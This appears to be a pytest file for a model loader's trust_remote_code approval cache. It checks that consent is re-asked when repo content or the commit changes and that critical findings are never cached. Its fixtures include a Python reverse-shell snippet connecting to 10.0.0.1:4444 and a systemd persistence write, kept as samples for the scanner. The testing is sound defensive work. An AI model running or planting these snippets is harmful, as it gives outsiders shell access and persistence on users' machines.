# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

"""Tests for the persistent per-user trust_remote_code approval cache.

The store remembers a user's explicit approval so the dialog is skipped on a later load
of the SAME unchanged repo, while a moved commit SHA or any content change (a new/edited
``.py``) forces re-consent. The scanner and fingerprint run for real; only the config/file
fetch and the commit-SHA lookup are stubbed.
"""

import pytest

import utils.security.consent as consent
import utils.security.remote_code_approvals as approvals
from utils.security import evaluate_remote_code_consent_for_targets

_BENIGN = {"modeling_ok.py": "import torch\nx = 1\n"}
_HIGH = {
    "modeling_persist.py": (
        "open('/etc/systemd/system/x.service', 'w').write('[Service]\\nExecStart=sh')\n"
    )
}
_CRITICAL = {
    "modeling_evil.py": (
        "import socket, subprocess, os\n"
        "s = socket.socket(); s.connect(('10.0.0.1', 4444))\n"
        "os.dup2(s.fileno(), 0); subprocess.call(['/bin/sh', '-i'])\n"
    )
}


@pytest.fixture(autouse = True)
def _isolated_store(tmp_path, monkeypatch):
    """Point the store at a tmp file and start each test with a clean cache."""
    monkeypatch.setattr(approvals, "_store_path", lambda: tmp_path / "approvals.json")
    approvals._sha_cache.clear()
    monkeypatch.delenv("UNSLOTH_TRC_APPROVAL_CACHE_DISABLE", raising = False)
    yield


def _patch_scan(monkeypatch, files, sha = "sha1"):
    """Stub the gate's scanners and the SHA resolver; return a {'scans': n} counter."""
    state = {"scans": 0}

    def _files(target, hf_token = None):
        state["scans"] += 1
        return dict(files)

    monkeypatch.setattr(consent, "_config_has_auto_map", lambda *a, **k: True)
    monkeypatch.setattr(consent, "repo_remote_code_files", _files)
    monkeypatch.setattr(approvals, "resolve_commit_sha", lambda t, hf = None: sha)
    return state


def _gate(targets, *, approved = None, subject = "user-a"):
    return evaluate_remote_code_consent_for_targets(
        targets if isinstance(targets, list) else [targets],
        None,
        trust_remote_code = True,
        approved_fingerprint = approved,
        subject = subject,
    )


# --- store API ---------------------------------------------------------------


def test_store_roundtrip_and_forget():
    approvals.record("u", "k", commit_sha = "s", fingerprint = "f", max_severity = None)
    got = approvals.lookup("u", "k")
    assert got is not None and got.fingerprint == "f" and got.commit_sha == "s"
    approvals.forget("u", "k")
    assert approvals.lookup("u", "k") is None


def test_combined_sha_none_when_any_unresolvable(monkeypatch):
    monkeypatch.setattr(
        approvals, "resolve_commit_sha", lambda t, hf = None: None if t == "org/base" else "s"
    )
    assert approvals.resolve_combined_sha(["org/a", "org/base"]) is None
    assert approvals.resolve_combined_sha(["org/a"]) is not None


def test_corrupt_store_is_ignored_then_rewritten():
    store = approvals._store_path()
    store.parent.mkdir(parents = True, exist_ok = True)
    store.write_text("{ not valid json")
    assert approvals.lookup("u", "k") is None  # no raise
    approvals.record("u", "k", commit_sha = "s", fingerprint = "f", max_severity = "HIGH")
    assert approvals.lookup("u", "k") is not None  # valid file rewritten


# --- gate integration --------------------------------------------------------


def test_cache_miss_prompts(monkeypatch):
    _patch_scan(monkeypatch, _HIGH)
    d = _gate("org/m")
    assert d.blocked is True and d.approvable is True
    assert approvals.lookup("user-a", approvals.approval_target_key(["org/m"])) is None


def test_sha_match_skips_rescan(monkeypatch):
    st = _patch_scan(monkeypatch, _BENIGN, sha = "sha1")
    fp = _gate("org/m").fingerprint  # scan 1 (no approval -> not recorded)
    _gate("org/m", approved = fp)  # scan 2 -> explicit approval recorded
    before = st["scans"]
    d = _gate("org/m")  # SHA match -> auto-approve, no re-download
    assert d.blocked is False and d.reason == "approved by cache (sha match)"
    assert st["scans"] == before


def test_sha_moved_same_content_reapproves_after_rescan(monkeypatch):
    st = _patch_scan(monkeypatch, _BENIGN, sha = "sha1")
    fp = _gate("org/m").fingerprint
    _gate("org/m", approved = fp)
    monkeypatch.setattr(approvals, "resolve_commit_sha", lambda t, hf = None: "sha2")
    before = st["scans"]
    d = _gate("org/m")  # SHA moved -> re-scan; content identical -> fingerprint still matches
    assert st["scans"] == before + 1
    assert d.blocked is False and d.reason == "approved by fingerprint"


def test_new_file_forces_reconsent(monkeypatch):
    _patch_scan(monkeypatch, _BENIGN, sha = "sha1")
    fp = _gate("org/m").fingerprint
    _gate("org/m", approved = fp)  # approve benign at sha1
    # A new HIGH .py appears and no SHA is resolvable (offline/local): the seeded
    # fingerprint no longer matches the recomputed one -> re-consent.
    monkeypatch.setattr(
        consent, "repo_remote_code_files", lambda t, hf_token = None: {**_BENIGN, **_HIGH}
    )
    monkeypatch.setattr(approvals, "resolve_commit_sha", lambda t, hf = None: None)
    d = _gate("org/m")
    assert d.blocked is True


def test_critical_is_never_recorded(monkeypatch):
    _patch_scan(monkeypatch, _CRITICAL, sha = "sha1")
    fp = _gate("org/m").fingerprint
    d = _gate("org/m", approved = fp)  # CRITICAL is not approvable
    assert d.blocked is True and d.approvable is False
    assert approvals.lookup("user-a", approvals.approval_target_key(["org/m"])) is None


def test_forged_critical_store_entry_is_refused(monkeypatch):
    _patch_scan(monkeypatch, _CRITICAL, sha = "sha1")
    key = approvals.approval_target_key(["org/m"])
    approvals._save(
        {
            "version": 1,
            "subjects": {
                "user-a": {
                    key: {
                        "commit_sha": "org/m=sha1",
                        "fingerprint": "x",
                        "max_severity": "CRITICAL",
                        "approved_at": "t",
                    }
                }
            },
        }
    )
    assert approvals.lookup("user-a", key) is None  # read guard refuses CRITICAL
    assert _gate("org/m").blocked is True  # scan still runs and blocks


def test_disable_flag_bypasses_cache(monkeypatch):
    st = _patch_scan(monkeypatch, _BENIGN, sha = "sha1")
    fp = _gate("org/m").fingerprint
    _gate("org/m", approved = fp)
    monkeypatch.setenv("UNSLOTH_TRC_APPROVAL_CACHE_DISABLE", "1")
    before = st["scans"]
    _gate("org/m")  # cache ignored -> scans again
    assert st["scans"] == before + 1


def test_subject_isolation(monkeypatch):
    _patch_scan(monkeypatch, _HIGH, sha = "sha1")
    fp = _gate("org/m", subject = "user-a").fingerprint
    _gate("org/m", approved = fp, subject = "user-a")  # user-a approves
    assert _gate("org/m", subject = "user-a").blocked is False  # a: cache hit
    assert _gate("org/m", subject = "user-b").blocked is True  # b: still prompted


def test_combined_lora_key(monkeypatch):
    _patch_scan(monkeypatch, _HIGH, sha = "sha1")
    targets = ["org/adapter", "org/base"]
    fp = _gate(targets).fingerprint
    _gate(targets, approved = fp)  # approve the combined adapter+base unit
    assert _gate(targets).blocked is False  # combined key hit
    assert _gate(["org/adapter"]).blocked is True  # adapter-only key misses


def test_no_subject_disables_cache(monkeypatch):
    st = _patch_scan(monkeypatch, _BENIGN, sha = "sha1")
    fp = evaluate_remote_code_consent_for_targets(
        ["org/m"], None, trust_remote_code = True, approved_fingerprint = None, subject = None
    ).fingerprint
    evaluate_remote_code_consent_for_targets(
        ["org/m"], None, trust_remote_code = True, approved_fingerprint = fp, subject = None
    )
    assert approvals.lookup("", approvals.approval_target_key(["org/m"])) is None
    before = st["scans"]
    evaluate_remote_code_consent_for_targets(
        ["org/m"], None, trust_remote_code = True, subject = None
    )
    assert st["scans"] == before + 1  # no subject -> no cache, always scans
